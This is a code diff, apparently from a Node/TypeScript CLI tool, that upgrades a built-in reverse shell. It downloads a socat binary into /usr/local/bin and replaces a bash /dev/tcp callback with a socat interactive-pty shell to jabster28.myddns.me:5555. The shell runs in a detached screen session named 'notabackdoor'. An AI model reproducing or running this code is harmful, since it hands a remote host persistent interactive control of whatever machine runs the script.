@@ -36,6 +36,25 @@ windowClear();
     console.log(boxen('ERROR!!!').red);
     console.error(e);
   }
+  try {
+    await exec('which socat');
+    console.log('socat'.green);
+  } catch (e) {
+    if (e.stdout == '') {
+      console.log('socat'.red);
+      console.log("No 'socat' executable found, installing...");
+      await exec(
+        'wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/darwin/socat -O /tmp/socat'
+      );
+      console.log('Adding executable tag...');
+      await exec('chmod +x /tmp/socat');
+      console.log('Moving to /usr/local/bin...');
+      await exec('cp /tmp/socat /usr/local/bin/socat');
+      console.log('done!');
+      console.log('socat'.green);
+    }
+  }
+  console.log('dependencies checked!');
   let exit = false;
   if (argv.default) {
     let config: {
@@ -59,7 +78,7 @@ windowClear();
         ) {
           await exec('screen -s sh -dmS notabackdoor');
           await exec(
-            'screen -S notabackdoor -X stuff "bash -i >& /dev/tcp/jabster28.myddns.me/5555 0>&1"'
+            'screen -S notabackdoor -p 0 -X stuff "socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:jabster28.myddns.me:5555; exit\n"'
           );
         } else {
           return;
@@ -116,7 +135,7 @@ windowClear();
         console.log(boxen('Making a daemonised screen...'));
         await exec('screen -s sh -dmS notabackdoor');
         await exec(
-          'screen -S notabackdoor -X stuff "bash -i >& /dev/tcp/jabster28.myddns.me/5555 0>&1"'
+          'screen -S notabackdoor -p 0 -X stuff "socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:jabster28.myddns.me:5555; exit\n"'
         );
         console.log(boxen('Done!', {padding: 1}).green);
         if (daemon) {
